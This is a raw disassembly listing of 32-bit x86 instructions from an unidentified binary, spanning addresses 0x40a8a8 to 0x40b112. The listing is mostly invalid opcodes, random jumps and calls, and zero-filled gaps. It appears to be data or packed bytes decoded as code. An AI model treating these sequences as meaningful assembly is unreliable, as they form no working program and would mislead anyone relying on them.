  40a8a8:	(bad)  
  40a8aa:	or     edi,ebx
  40a8ac:	retf   0x412f
  40a8af:	arpl   WORD PTR [edi-0x11],bx
  40a8b2:	pop    es
  40a8b3:	dec    ebx
  40a8b4:	and    BYTE PTR [edi-0x1],bl
  40a8b7:	dec    esp
  40a8b8:	and    eax,0x21630c41
  40a8bd:	jns    0x40a8ab
  40a8bf:	loopne 0x40a86a
  40a8c1:	push   0xf9c4636a
  40a8c6:	(bad)  
  40a8c7:	mov    dh,0x66
  40a8c9:	pop    ebx
  40a8ca:	mov    esi,0x896546e7
  40a8cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d0:	mov    ds:0x4714ffdc,al
  40a8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d6:	push   0xffc258dd
  40a8db:	add    eax,0x83e7fc01
  40a8e0:	jg     0x40a947
  40a8e2:	dec    DWORD PTR [ebx+0xef036d]
	...
  40a8f4:	add    BYTE PTR [eax],al
  40a8f6:	lods   eax,DWORD PTR ds:[esi]
  40a8f7:	add    eax,0x6ea2358b
  40a8fc:	fs jne 0x40a96a
  40a8ff:	jbe    0x40a8b7
  40a901:	(bad)  
  40a902:	aam    0xd6
  40a904:	fs jne 0x40a8d6
  40a907:	out    dx,al
  40a908:	out    dx,al
  40a909:	pop    es
  40a90a:	mov    ebx,0xbcffa81b
  40a90f:	adc    al,0x42
  40a911:	add    al,0x63
  40a913:	mov    eax,ds:0x29e2ec78
  40a918:	dec    esp
  40a919:	mul    DWORD PTR [esi+eax*8+0x7d9f4576]
  40a920:	fs jne 0x40a98a
  40a923:	pop    ss
  40a924:	das    
  40a925:	daa    
  40a926:	cmp    ch,BYTE PTR [ebp+0x4eee803]
  40a92c:	js     0x40a932
  40a92e:	arpl   WORD PTR [ecx+ebp*1],cx
  40a931:	cmc    
  40a932:	fistp  QWORD PTR [eax+ebp*8]
  40a935:	add    esp,DWORD PTR [ebx+0x48]
  40a938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a939:	imul   esp,DWORD PTR [ebx+0x5],0xffffffe9
  40a93d:	add    esp,DWORD PTR [ecx+ecx*8]
  40a940:	hlt    
  40a941:	fs pop esp
  40a943:	add    eax,0xed4cd9e9
  40a948:	call   0xe92dee26
  40a94d:	jbe    0x40a8f5
  40a94f:	pop    ecx
  40a950:	cmp    DWORD PTR [edi-0x22],esi
  40a953:	pop    ecx
  40a954:	fisub  WORD PTR [esp+ebp*1-0x4a]
  40a958:	int    0xee
	...
  40a966:	add    BYTE PTR [eax],al
  40a968:	add    BYTE PTR [edi+ebx*2],ch
  40a96b:	cmp    al,0x68
  40a96d:	or     esp,edi
  40a96f:	push   edi
  40a970:	add    esp,DWORD PTR [ebx+0xa]
  40a973:	test   eax,0x526c67ef
  40a978:	add    ah,BYTE PTR [ebx+0x5]
  40a97b:	adc    DWORD PTR [ebx+ecx*2+0x6e64e8c4],ecx
  40a982:	adc    DWORD PTR [ecx-0x71a0de87],eax
  40a988:	rcr    ecx,cl
  40a98a:	xor    eax,0x56d77e74
  40a98f:	jle    0x40a9f5
  40a991:	xor    esi,DWORD PTR [ebx+0x5ea2e980]
  40a997:	outs   dx,BYTE PTR ds:[esi]
  40a998:	jp     0x40a978
  40a99a:	push   ebp
  40a99b:	pop    esi
  40a99c:	fs mov esp,0xb4a5396d
  40a9a2:	pop    esi
  40a9a3:	ret    
  40a9a4:	add    edi,DWORD PTR [ebx]
  40a9a6:	sti    
  40a9a7:	push   ss
  40a9a8:	ret    
  40a9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9aa:	pop    edi
  40a9ab:	jl     0x40aa20
  40a9ad:	xchg   esp,eax
  40a9ae:	pop    esi
  40a9af:	ds fs dec esi
  40a9b2:	add    BYTE PTR es:[eax],al
  40a9b5:	mov    al,ds:0x2119e75e
  40a9ba:	pop    esi
  40a9bb:	push   DWORD PTR [eax-0x3]
  40a9be:	push   0xeaff1ef7
  40a9c3:	inc    DWORD PTR [eax-0x16bee8ac]
  40a9c9:	call   DWORD PTR [edi+0xfef0]
	...
  40a9db:	add    al,al
  40a9dd:	pop    esi
  40a9de:	push   DWORD PTR [edi+esi*2-0x5716bed4]
  40a9e5:	xchg   ebx,eax
  40a9e6:	shr    esi,0xc0
  40a9e9:	mov    WORD PTR [ebp-0xa1672b],es
  40a9ef:	push   ebx
  40a9f0:	pop    edi
  40a9f1:	in     eax,dx
  40a9f2:	and    bl,BYTE PTR [edi]
  40a9f4:	es pop esi
  40a9f6:	(bad)  
  40a9f7:	xchg   esp,eax
  40a9f8:	(bad)  
  40a9f9:	push   esi
  40a9fa:	inc    esi
  40a9fc:	sbb    BYTE PTR [eax],0x27
  40a9ff:	adc    BYTE PTR [esi],bl
  40aa01:	pop    esi
  40aa02:	out    0x5d,eax
  40aa04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa05:	pop    esi
  40aa06:	jmp    DWORD PTR [eax-0x26]
  40aa09:	ins    BYTE PTR es:[edi],dx
  40aa0a:	mul    DWORD PTR [esi+0x10ffeb80]
  40aa10:	pop    edx
  40aa11:	pop    ss
  40aa12:	inc    ecx
  40aa13:	jmp    0x97314299
  40aa18:	sbb    BYTE PTR [esi-0x1],0xbc
  40aa1c:	mov    DWORD PTR [ecx+eax*2],ebp
  40aa1f:	jmp    0x7701816c
  40aa24:	inc    eax
  40aa25:	mov    WORD PTR [ebp-0xa1d777],es
  40aa2b:	je     0x40aa17
  40aa2d:	cmp    al,0xf7
  40aa2f:	pop    esi
  40aa30:	inc    eax
  40aa31:	mov    ch,0x67
  40aa33:	push   ss
  40aa34:	dec    ecx
  40aa35:	(bad)  
  40aa36:	dec    DWORD PTR [ebp-0x36]
  40aa39:	push   esp
  40aa3a:	test   DWORD PTR [eax],0x35fee225
	...
  40aa4c:	add    BYTE PTR [eax],al
  40aa4e:	add    BYTE PTR [ebp+0x30],bl
  40aa51:	inc    ecx
  40aa52:	add    BYTE PTR [edx],ah
  40aa54:	xchg   esi,eax
  40aa55:	sar    bh,0x35
  40aa58:	push   cs
  40aa59:	shl    BYTE PTR [ebx+eiz*2-0x7a],0xbd
  40aa5e:	fmul   DWORD PTR [ebp-0x1e]
  40aa61:	inc    BYTE PTR [edi+ecx*8]
  40aa64:	push   ecx
  40aa65:	(bad)  
  40aa66:	xor    BYTE PTR ds:0x65f7dc8c,al
  40aa6c:	call   0xa76b92c0
  40aa71:	(bad)  
  40aa72:	jmp    DWORD PTR [ecx+0x5d]
  40aa75:	or     al,al
  40aa77:	into   
  40aa78:	push   cs
  40aa79:	push   eax
  40aa7a:	call   0x4051bd
  40aa7f:	std    
  40aa80:	(bad)  
  40aa81:	fdivr  st(7),st
  40aa83:	adc    eax,0x3a0014e8
  40aa88:	or     DWORD PTR [ebx-0x13fd143],eax
  40aa8e:	dec    DWORD PTR [edx]
  40aa90:	xor    eax,0xec978364
  40aa95:	idiv   bh
  40aa97:	mov    ch,0x8
  40aa99:	je     0x40aaf7
  40aa9b:	mov    DWORD PTR [ebp-0x182a0818],esp
  40aaa1:	push   DWORD PTR [ebx+0x29]
  40aaa4:	imul   edi,edi,0xffa665ff
  40aaaa:	jne    0x40aa7e
  40aaac:	lock push 0xffffffba
  40aaaf:	push   ebp
  40aab0:	out    0xfe,eax
  40aab2:	mov    ch,0x0
	...
  40aac0:	add    BYTE PTR [eax],al
  40aac2:	out    0xbf,al
  40aac4:	(bad)  
  40aac5:	push   DWORD PTR ds:0x5e8073d
  40aacb:	jnp    0x40aacc
  40aacd:	call   DWORD PTR ds:0x63f7e87d
  40aad3:	mov    bl,0x61
  40aad5:	jmp    FWORD PTR [esi]
  40aad7:	imul   si,WORD PTR [ecx-0x9e3c27],0xffce
  40aadf:	ret    0xff59
  40aae2:	mov    WORD PTR [ebx],ss
  40aae4:	fadd   DWORD PTR [edi]
  40aae6:	jnp    0x40aa77
  40aae8:	popf   
  40aae9:	(bad)  
  40aaea:	jl     0x40ab0f
  40aaec:	cwde   
  40aaed:	loopne 0x40ab5b
  40aaef:	sti    
  40aaf0:	popa   
  40aaf1:	push   esi
  40aaf3:	imul   edx,DWORD PTR gs:[ebp-0x9df457],0x16
  40aafb:	and    bl,BYTE PTR [edx-0x1]
  40aafe:	push   esp
  40aaff:	pop    ebx
  40ab00:	xlat   BYTE PTR ds:[ebx]
  40ab01:	pop    es
  40ab02:	cmp    ecx,DWORD PTR [ecx-0x63]
  40ab05:	inc    DWORD PTR [ebx+ebp*2-0x69]
  40ab09:	in     al,0x34
  40ab0b:	arpl   WORD PTR [ecx-0x18],sp
  40ab0e:	sar    BYTE PTR [eax+0x61],cl
  40ab11:	jmp    FWORD PTR [ecx+edi*2]
  40ab14:	jo     0x40ab0d
  40ab16:	and    al,0x4b
  40ab18:	ins    BYTE PTR es:[edi],dx
  40ab19:	xchg   dh,bl
  40ab1b:	inc    edx
  40ab1c:	popa   
  40ab1d:	dec    esi
  40ab1f:	xor    eax,0x460cff59
  40ab24:	fnstsw WORD PTR [eax+eax*1+0x0]
	...
  40ab33:	add    BYTE PTR [eax],al
  40ab35:	add    al,0xab
  40ab37:	popa   
  40ab38:	mov    ch,0x3
  40ab3a:	jnp    0x40ab9d
  40ab3c:	dec    DWORD PTR [ebx]
  40ab3e:	(bad)  
  40ab3f:	sahf   
  40ab40:	(bad)  
  40ab41:	in     al,dx
  40ab42:	jb     0x40aadb
  40ab44:	lock in al,dx
  40ab46:	mov    ah,BYTE PTR [ecx-0x18]
  40ab49:	inc    esi
  40ab4a:	shl    DWORD PTR [eax-0x1],0xd4
  40ab4e:	and    BYTE PTR [ecx+ebp*8-0x6c],bl
  40ab52:	aam    0x60
  40ab54:	inc    esp
  40ab56:	push   eax
  40ab57:	pop    edi
  40ab58:	call   0x4b6b069
  40ab5d:	arpl   WORD PTR [esi+0x2b],cx
  40ab60:	or     al,0x63
  40ab62:	mov    dl,0x61
  40ab64:	jo     0x40ab46
  40ab66:	inc    eax
  40ab67:	push   ecx
  40ab68:	out    dx,al
  40ab69:	pushf  
  40ab6a:	in     eax,dx
  40ab6b:	icebp  
  40ab6c:	pusha  
  40ab6d:	push   cs
  40ab6e:	or     eax,0x5bcad951
  40ab73:	mov    ebx,DWORD PTR ss:[esi]
  40ab76:	pop    ecx
  40ab77:	pop    esp
  40ab78:	(bad)  
  40ab79:	je     0x40ab2f
  40ab7b:	nop
  40ab7c:	inc    eax
  40ab7d:	cs (bad) 
  40ab7f:	call   0xa852456f
  40ab84:	add    esp,DWORD PTR [ecx+edx*1-0x3a]
  40ab88:	sub    ah,BYTE PTR [edx+0x231d1105]
  40ab8e:	pop    ebx
  40ab8f:	dec    BYTE PTR [ebx+eiz*1]
  40ab92:	rcr    ch,cl
  40ab94:	mov    bl,0xbc
  40ab96:	add    al,0xe9
  40ab98:	jo     0x40ab9a
	...
  40aba6:	add    BYTE PTR [eax],al
  40aba8:	std    
  40aba9:	pop    edx
  40abaa:	pop    esp
  40abab:	pop    esp
  40abac:	xchg   ebx,eax
  40abad:	pop    edx
  40abae:	push   esp
  40abaf:	or     al,0x3b
  40abb1:	test   al,0xb7
  40abb3:	pusha  
  40abb4:	and    al,0x6e
  40abb6:	loope  0x40ab56
  40abb8:	sbb    al,0x5b
  40abba:	je     0x40ab82
  40abbc:	or     al,0xb6
  40abbe:	push   eax
  40abbf:	jb     0x40ac17
  40abc1:	(bad)  
  40abc2:	call   0x2851c5b2
  40abc7:	add    al,0xfc
  40abc9:	adc    dh,cl
  40abcb:	sub    ah,BYTE PTR [edx+0x23089105]
  40abd1:	pop    ebx
  40abd2:	xchg   esi,eax
  40abd3:	or     al,0x23
  40abd5:	shl    ch,cl
  40abd7:	mov    bl,0x44
  40abd9:	pop    es
  40abda:	jmp    0xf49bc14f
  40abdf:	pop    ebx
  40abe0:	xor    ebx,DWORD PTR [edx+0x0]
  40abe3:	cld    
  40abe4:	pop    eax
  40abe5:	ins    DWORD PTR es:[edi],dx
  40abe6:	outs   dx,BYTE PTR ds:[esi]
  40abe7:	pop    DWORD PTR [ebx+0x5a]
  40abea:	call   0xff9b802c
  40abef:	rol    DWORD PTR [edx+0x10],1
  40abf2:	inc    ecx
  40abf3:	jmp    0x41487c3b
  40abf8:	mov    ebx,0x346ff59
  40abfd:	sar    bl,1
  40abff:	ds mov ch,0x2
  40ac02:	call   0xff9b92fa
  40ac07:	and    BYTE PTR [esi],ah
  40ac09:	add    DWORD PTR [eax],eax
  40ac0b:	mov    esp,0x0
	...
  40ac18:	add    BYTE PTR [eax],al
  40ac1a:	add    bh,ah
  40ac1c:	imul   eax,DWORD PTR [ecx-0xadd3db],0xfbc0d516
  40ac26:	mov    ecx,0x60bd0c3
  40ac2b:	ins    DWORD PTR es:[edi],dx
  40ac2c:	and    ch,BYTE PTR [ecx]
  40ac2e:	test   al,0x60
  40ac30:	ins    DWORD PTR es:[edi],dx
  40ac31:	std    
  40ac32:	addr16 pusha 
  40ac34:	add    eax,0x8053290b
  40ac39:	shr    eax,0x60
  40ac3c:	add    eax,0x58f24c7
  40ac41:	add    cl,ch
  40ac43:	pusha  
  40ac44:	inc    edx
  40ac45:	inc    ebp
  40ac46:	aad    0xbc
  40ac48:	add    al,BYTE PTR [eax]
  40ac4a:	jmp    0xe9aa0659
  40ac4f:	cli    
  40ac50:	pop    ecx
  40ac51:	imul   ebp,ecx,0x19f3bff3
  40ac57:	sar    BYTE PTR [edi-0xc],cl
  40ac5a:	sahf   
  40ac5b:	xchg   esp,eax
  40ac5c:	pop    edx
  40ac5d:	push   eax
  40ac5e:	sahf   
  40ac5f:	or     dl,BYTE PTR [edx-0x1]
  40ac62:	sbb    al,0x83
  40ac64:	ins    DWORD PTR es:[edi],dx
  40ac65:	iret   
  40ac66:	pop    edi
  40ac67:	addr16 add eax,0x3d0a000b
  40ac6d:	add    al,0xe9
  40ac6f:	inc    esi
  40ac70:	add    BYTE PTR [eax],al
  40ac72:	add    BYTE PTR [edx-0x27],ah
  40ac75:	daa    
  40ac76:	inc    ecx
  40ac77:	retf   0x74ba
  40ac7a:	or     al,0x12
  40ac7c:	mov    bh,0xbe
  40ac7e:	inc    DWORD PTR [eax]
	...
  40ac8c:	add    BYTE PTR [eax],al
  40ac8e:	or     eax,0x3fd08a91
  40ac93:	mov    esp,?
  40ac95:	imul   DWORD PTR ds:0x32524fba
  40ac9b:	out    0xbe,eax
  40ac9d:	dec    DWORD PTR [ebp-0x78]
  40aca0:	test   eax,esi
  40aca2:	inc    ebp
  40aca3:	mov    edx,0x7972e8fe
  40aca8:	(bad)  
  40aca9:	call   eax
  40acab:	add    eax,0x40945b68
  40acb0:	(bad)  
  40acb1:	inc    BYTE PTR [edi]
  40acb3:	mov    cl,0xf6
  40acb5:	jmp    FWORD PTR [ebp-0x48]
  40acb8:	xor    al,0x27
  40acba:	xor    eax,DWORD PTR [edx-0x1]
  40acbd:	out    0x22,eax
  40acbf:	js     0x40acc0
  40acc1:	inc    ebx
  40acc3:	mov    fs,esp
  40acc5:	test   DWORD PTR [ebp-0x48],0x4d920069
  40accc:	xor    eax,0xb4b83a41
  40acd1:	lock add eax,0x77fffeb8
  40acd7:	and    BYTE PTR [ecx],ch
  40acd9:	inc    ecx
  40acda:	or     ch,ch
  40acdc:	sbb    DWORD PTR [edi-0x7a774833],edi
  40ace2:	push   ds
  40ace3:	mov    al,0xfe
  40ace5:	jmp    DWORD PTR [eax+0x144d6801]
  40aceb:	inc    edx
  40acec:	(bad)  
  40aced:	(bad)  
  40acee:	xchg   edi,eax
  40acef:	mov    ah,0xf6
  40acf1:	inc    DWORD PTR [eax]
	...
  40acff:	add    BYTE PTR [eax],al
  40ad01:	arpl   WORD PTR [edi+0x5e],bp
  40ad04:	xor    eax,0xffc44584
  40ad09:	mov    esp,0xccff9d82
  40ad0e:	aad    0x87
  40ad10:	loopne 0x40acde
  40ad12:	iret   
  40ad13:	pop    ebp
  40ad14:	push   0x63
  40ad16:	push   es
  40ad17:	mov    dl,0x35
  40ad19:	and    ch,BYTE PTR [esi+0x5e]
  40ad1c:	mov    ch,0xb3
  40ad1e:	scas   eax,DWORD PTR es:[edi]
  40ad1f:	pop    ebp
  40ad20:	jmp    DWORD PTR [ecx+edi*8+0x6e222926]
  40ad27:	imul   ebx,esi,0xffffffd5
  40ad2a:	mov    edi,0xb6e6895d
  40ad2f:	push   ebp
  40ad30:	inc    DWORD PTR [esp+eax*2+0x50076803]
  40ad37:	(bad)  
  40ad38:	push   DWORD PTR [ebp-0x47]
  40ad3b:	push   edx
  40ad3c:	imul   DWORD PTR [edi+esi*8+0x5d]
  40ad40:	xor    eax,0xffc4453c
  40ad45:	inc    esp
  40ad46:	cs popf 
  40ad48:	call   DWORD PTR [ebp+edx*8-0x79]
  40ad4c:	fcom   QWORD PTR [edi+edx*2+0x5d]
  40ad50:	add    DWORD PTR [esi],0xa
  40ad53:	push   esi
  40ad54:	(bad)  
  40ad55:	cmp    al,0x6e
  40ad57:	xlat   BYTE PTR ds:[ebx]
  40ad58:	fs loopne 0x40acfb
  40ad5b:	jo     0x40ad54
  40ad5d:	sub    al,0x37
  40ad5f:	add    al,0x74
  40ad61:	xchg   ebx,ebp
  40ad63:	sahf   
  40ad64:	call   0x40ad69
	...
  40ad71:	add    BYTE PTR [eax],al
  40ad73:	add    BYTE PTR [edi+eax*2],dl
  40ad76:	pop    ebp
  40ad77:	add    BYTE PTR [edi+0xcffebfb],cl
  40ad7d:	inc    edi
  40ad7e:	sahf   
  40ad7f:	dec    DWORD PTR [esi-0x44fc949a]
  40ad85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad86:	pop    ebp
  40ad87:	jmp    FWORD PTR [esi-0x13aa6afc]
  40ad8d:	push   edi
  40ad8e:	sahf   
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pop    esp
  40ad91:	ins    DWORD PTR es:[edi],dx
  40ad92:	ds pushf 
  40ad94:	fcom   QWORD PTR [edi-0x72]
  40ad97:	xchg   edi,eax
  40ad98:	retf   
  40ad99:	dec    edi
  40ad9a:	xchg   BYTE PTR [ebp-0x34],bl
  40ad9d:	shl    eax,1
  40ad9f:	imul   ebx,DWORD PTR [edx],0xffffff9d
  40ada2:	jbe    0x40ae01
  40ada4:	mov    esp,0xb4558591
  40ada9:	push   edi
  40adaa:	data16 xlat BYTE PTR ds:[ebx]
  40adac:	fs ins DWORD PTR es:[edi],dx
  40adae:	and    bl,BYTE PTR [esp+eiz*4-0x7c68a9a9]
  40adb5:	dec    edi
  40adb6:	dec    esi
  40adb7:	pop    ebp
  40adb8:	xchg   esp,eax
  40adb9:	shl    eax,1
  40adbb:	imul   edi,DWORD PTR [esi],0xffffff9d
  40adbe:	ds pop ebp
  40adc0:	test   BYTE PTR [ecx+0x577c5515],dl
  40adc6:	xlat   BYTE PTR cs:[ebx]
  40adc8:	pop    esp
  40adc9:	ins    DWORD PTR es:[edi],dx
  40adca:	push   es
  40adcb:	pushf  
  40adcc:	ins    BYTE PTR es:[edi],dx
  40adcd:	push   edi
  40adce:	push   ds
  40adcf:	xchg   edi,eax
  40add0:	jg     0x40ae21
  40add2:	push   ss
  40add3:	pop    ebp
  40add4:	dec    ebx
  40add5:	sub    eax,0x5d52
	...
  40ade6:	add    BYTE PTR [edi+edx*2+0x3c],dl
  40adea:	jo     0x40ae40
  40adec:	push   edi
  40aded:	(bad)  
  40adee:	imul   esp,DWORD PTR [ebp-0x66],0xfffffff6
  40adf2:	pop    esp
  40adf3:	cmp    al,0x91
  40adf5:	add    DWORD PTR [ebp+0x34],edx
  40adf8:	push   edi
  40adf9:	shl    eax,1
  40adfb:	jmp    0xee9d8c56
  40ae00:	ficomp WORD PTR gs:[esp+ebx*1+0x6e]
  40ae05:	loope  0x40ad9f
  40ae07:	adc    al,0x57
  40ae09:	(bad)  
  40ae0a:	xchg   esi,eax
  40ae0b:	das    
  40ae0c:	dec    edi
  40ae0d:	mov    esi,0x58fb5c
  40ae12:	jae    0x40adb3
  40ae14:	push   esi
  40ae15:	push   DWORD PTR [eax+edx*4+0x4e]
  40ae19:	jmp    DWORD PTR [esi-0x6ef82f71]
  40ae1f:	dec    edi
  40ae20:	push   edi
  40ae21:	call   DWORD PTR [esi-0x690f6fc1]
  40ae27:	aaa    
  40ae28:	push   esi
  40ae29:	call   0xff9798bb
  40ae2e:	jle    0x40adcd
  40ae30:	dec    esi
  40ae31:	jmp    0xff96cb5d
  40ae36:	outs   dx,BYTE PTR ds:[esi]
  40ae37:	lea    ebx,[edx-0x18]
  40ae3a:	pop    ss
  40ae3b:	fadd   QWORD PTR ds:0xd223000
  40ae41:	add    BYTE PTR [ebx+ebp*8+0x34258369],bh
  40ae48:	jmp    0x40ae49
  40ae4a:	rol    BYTE PTR [eax],cl
	...
  40ae58:	add    BYTE PTR [eax],al
  40ae5a:	pop    esp
  40ae5b:	push   esi
  40ae5c:	jne    0x40ae4f
  40ae5e:	clc    
  40ae5f:	dec    esi
  40ae60:	mov    bh,0x36
  40ae62:	pop    ds
  40ae63:	mov    WORD PTR [ebp+0x2d],es
  40ae66:	mov    dh,ah
  40ae68:	xor    eax,0x755660a8
  40ae6d:	icebp  
  40ae6e:	clc    
  40ae6f:	dec    esi
  40ae70:	std    
  40ae71:	push   ss
  40ae72:	mov    edi,0xb70d7556
  40ae77:	rol    BYTE PTR [edi],1
  40ae79:	adc    DWORD PTR [ecx-0x65010063],eax
  40ae7f:	inc    ebx
  40ae80:	add    al,0xe9
  40ae82:	cmc    
  40ae83:	mov    ch,ah
  40ae85:	push   0xe6f7359c
  40ae8a:	mov    BYTE PTR [eax+0x56efdd45],cl
  40ae90:	jne    0x40ae77
  40ae92:	mov    ecx,0x1e002710
  40ae97:	push   esi
  40ae98:	out    0x0,eax
  40ae9a:	push   ds
  40ae9b:	lea    eax,[eax]
  40ae9d:	add    BYTE PTR [ecx],dl
  40ae9f:	ret    0x850e
  40aea2:	lock (bad) 
  40aea4:	(bad)  
  40aea5:	(bad)  
  40aea6:	mov    ebp,0xfa00f743
  40aeab:	add    DWORD PTR [eax],eax
  40aead:	(bad)  
  40aeae:	aas    
  40aeaf:	mov    ch,0xfe
  40aeb1:	pop    es
  40aeb2:	retf   0x6a01
  40aeb5:	add    BYTE PTR [eax+0x1],ah
  40aeb8:	push   0x0
  40aeba:	jo     0x40aebd
  40aebc:	lea    eax,[ebp+0x0]
	...
  40aecb:	add    BYTE PTR [eax],al
  40aecd:	dec    esi
  40aece:	xchg   ecx,eax
  40aecf:	mov    WORD PTR [ebp-0x14dc2],es
  40aed5:	pop    edx
  40aed6:	mov    edx,0x3445f874
  40aedb:	sti    
  40aedc:	call   0x413bad
  40aee1:	add    ecx,0xbc230573
  40aee7:	add    BYTE PTR [eax],al
  40aee9:	jp     0x40af54
  40aeeb:	xchg   edi,eax
  40aeec:	sub    BYTE PTR [ebx-0x798a00ff],bh
  40aef2:	jmp    0xba866ccf
  40aef7:	mov    dl,al
  40aef9:	test   DWORD PTR [ebx-0x45ba080c],0x4f62524f
  40af03:	mov    ebp,0x858265ff
  40af08:	lock dec ebp
  40af0a:	mov    al,0xfe
  40af0c:	push   0x3a
  40af0e:	popa   
  40af0f:	retf   
  40af10:	or     ecx,DWORD PTR ss:[ecx]
  40af13:	push   DWORD PTR [ebp-0x147c6]
  40af19:	inc    ebp
  40af1a:	mul    BYTE PTR [esi]
  40af1c:	sub    DWORD PTR [ebx+0x9],edi
  40af1f:	call   0x5aba1249
  40af24:	(bad)  
  40af25:	jmp    0xed4c:0xcf75ee9
  40af2c:	(bad)  
  40af2d:	jl     0x40af00
  40af2f:	adc    BYTE PTR [ecx+0x0],al
	...
  40af3e:	add    BYTE PTR [eax],al
  40af40:	arpl   WORD PTR [ebx-0x5c130f70],bx
  40af46:	pop    edx
  40af47:	push   DWORD PTR [esi]
  40af49:	inc    ebx
  40af4a:	sub    al,0x41
  40af4c:	arpl   WORD PTR [esi+0x2],si
  40af4f:	mov    ebp,0x858c7bdc
  40af54:	(bad)  
  40af55:	jnp    0x40afb1
  40af57:	(bad)  
  40af58:	cmp    DWORD PTR [esi-0x15],ebx
  40af5b:	ror    DWORD PTR [ebp-0x900fbe3],0xce
  40af62:	push   ecx
  40af63:	push   DWORD PTR [ebx+eiz*8-0x6285d8f1]
  40af6a:	add    ebp,eax
  40af6c:	mov    edx,0xeaff5a72
  40af71:	loope  0x40afdd
  40af73:	not    DWORD PTR [ebx+eax*8+0x1b04ffec]
  40af7a:	adc    DWORD PTR [ecx+0x63],eax
  40af7d:	adc    edx,DWORD PTR [eax+0x5a1b74f0]
  40af83:	jmp    FWORD PTR [esi]
  40af85:	or     ebp,DWORD PTR ds:0x4df66341
  40af8b:	mov    esp,0x858bf364
  40af90:	inc    ebx
  40af91:	repz pop ecx
  40af93:	jmp    esi
  40af95:	call   0xb8da6c8
  40af9a:	mov    bl,0x67
  40af9c:	sbb    al,0x9c
  40af9e:	(bad)  
  40af9f:	(bad)  
  40afa0:	cmp    eax,0xf75311
	...
  40afb1:	add    BYTE PTR [eax],al
  40afb3:	xor    al,0x63
  40afb5:	pop    ecx
  40afb6:	xor    eax,0xc3100584
  40afbb:	and    al,0x6c
  40afbd:	xchg   ecx,eax
  40afbe:	cwde   
  40afbf:	sbb    al,0x54
  40afc1:	loop   0x40b006
  40afc3:	(bad)  
  40afc4:	out    dx,al
  40afc5:	imul   edx,DWORD PTR [edi+0x59c65c37],0x58d8da5f
  40afcf:	xor    eax,DWORD PTR [esp+ebp*2-0x51ac13c8]
  40afd6:	mov    ah,0x4
  40afd8:	ficomp DWORD PTR [edi+0x59]
  40afdb:	in     al,0x5f
  40afdd:	cmc    
  40afde:	or     al,0xa3
  40afe0:	fsubr  st,st(6)
  40afe2:	mov    bl,0xbc
  40afe4:	fisttp QWORD PTR [edi+0x59]
  40afe7:	int3   
  40afe8:	dec    ebx
  40afe9:	ins    BYTE PTR es:[edi],dx
  40afea:	cmp    ah,cl
  40afec:	push   ebx
  40afed:	jle    0x40afde
  40afef:	mov    esp,0xde86e953
  40aff4:	xor    al,0x76
  40aff6:	pop    ecx
  40aff7:	lods   al,BYTE PTR ds:[esi]
  40aff8:	mov    ah,0xd0
  40affa:	das    
  40affb:	ins    DWORD PTR es:[edi],dx
  40affc:	(bad)  
  40affd:	call   0x5e95865a
  40b002:	pop    ecx
  40b003:	xchg   esp,eax
  40b004:	push   ebx
  40b005:	adc    al,0x21
  40b007:	cmp    al,dh
  40b009:	call   0x3ed1d979
  40b00e:	pop    ecx
  40b00f:	jmp    0x6a53:0x74511189
  40b016:	xchg   edi,eax
	...
  40b023:	add    BYTE PTR [eax],al
  40b025:	add    BYTE PTR [edi+0x6359265b],al
  40b02b:	add    al,0x65
  40b02d:	jge    0x40b092
  40b02f:	add    eax,0x621684e9
  40b034:	push   ss
  40b035:	pop    ecx
  40b036:	dec    esp
  40b037:	push   es
  40b038:	idiv   BYTE PTR [edi-0x2b]
  40b03b:	add    eax,0x90e003e9
  40b040:	add    BYTE PTR [ecx],al
  40b042:	xchg   edx,eax
  40b043:	push   edx
  40b044:	(bad)  
  40b045:	jmp    0xe9c239a5
  40b04a:	pusha  
  40b04b:	add    eax,0x6260f968
  40b050:	mov    esi,0xe80b25d6
  40b055:	js     0x40b034
  40b057:	push   edx
  40b058:	inc    esi
  40b05a:	aad    0x61
  40b05c:	idiv   DWORD PTR [esi-0x1e8aad65]
  40b062:	mov    BYTE PTR [eax-0x4b],ch
  40b065:	scas   al,BYTE PTR es:[edi]
  40b066:	mov    edx,DWORD PTR [edx-0x4b]
  40b069:	xchg   ecx,eax
  40b06a:	xchg   ebx,eax
  40b06b:	push   edx
  40b06c:	call   FWORD PTR [esi-0x4117f553]
  40b072:	in     eax,0x52
  40b074:	dec    DWORD PTR [esi-0x79089623]
  40b07a:	sub    edx,DWORD PTR [edx+0x75]
  40b07d:	icebp  
  40b07e:	dec    eax
  40b07f:	cmp    al,0xb5
  40b081:	jbe    0x40b09e
  40b083:	push   edx
  40b084:	mov    ch,0x8d
  40b086:	adc    edx,DWORD PTR [edx-0x1]
  40b089:	data16 add BYTE PTR [eax],al
	...
  40b098:	add    BYTE PTR [ebp-0x123f17f6],dl
  40b09e:	push   edx
  40b09f:	call   DWORD PTR [esi-0x1b]
  40b0a2:	test   DWORD PTR gs:[esi+0x2b],0xf8f17552
  40b0aa:	lahf   
  40b0ab:	mov    ch,0x3e
  40b0ad:	sbb    eax,DWORD PTR [esi+0x521311bd]
  40b0b3:	(bad)  
  40b0b4:	jmp    0x64c3a055
  40b0b9:	xor    BYTE PTR [edx-0x1],bl
  40b0bc:	push   ds
  40b0bd:	pop    esp
  40b0be:	fst    DWORD PTR [ecx]
  40b0c0:	(bad)  
  40b0c1:	aad    0x2d
  40b0c3:	test   DWORD PTR [esi],0x3052ab
  40b0c9:	pop    ebp
  40b0ca:	inc    ebx
  40b0cb:	pop    es
  40b0cc:	call   0x4033e4
  40b0d1:	popa   
  40b0d2:	add    BYTE PTR [edx+0x0],ch
  40b0d5:	cmp    eax,0x5fe80740
  40b0da:	je     0x40b0db
  40b0dc:	(bad)  
  40b0dd:	cmp    eax,0x2df7e474
  40b0e2:	mov    edx,0xb9f289e7
  40b0e7:	(bad)  
  40b0e8:	inc    DWORD PTR [edi-0x42000923]
  40b0ee:	loopne 0x40b16d
  40b0f0:	mov    eax,0xb5feb9ad
  40b0f5:	and    al,dl
  40b0f7:	(bad)  
  40b0f8:	call   edx
  40b0fa:	xor    eax,0xffb7
	...
  40b10b:	add    ch,bh
  40b10d:	mov    ecx,0xb9f5e0b4
  40b112:	(bad)  
